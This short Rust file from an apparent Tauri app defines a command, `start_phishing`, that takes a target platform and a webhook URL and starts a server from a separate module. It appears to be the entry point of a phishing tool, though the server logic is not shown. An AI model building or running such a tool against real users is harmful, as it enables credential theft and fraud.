pub mod server;

#[tauri::command]
pub fn start_phishing(
    platform: String,
    webhook_url: String,
) -> Result<server::Server, String> {
    server::start_server(platform, webhook_url)
}